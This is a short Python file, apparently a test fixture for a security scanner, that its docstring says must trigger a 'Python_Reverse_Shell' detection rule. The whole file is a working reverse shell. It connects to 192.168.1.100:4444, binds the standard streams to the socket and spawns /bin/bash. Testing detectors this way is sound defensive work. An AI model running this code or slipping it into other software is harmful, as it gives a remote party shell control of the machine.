"""Fixture: Python reverse shell – must trigger Python_Reverse_Shell rule."""
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
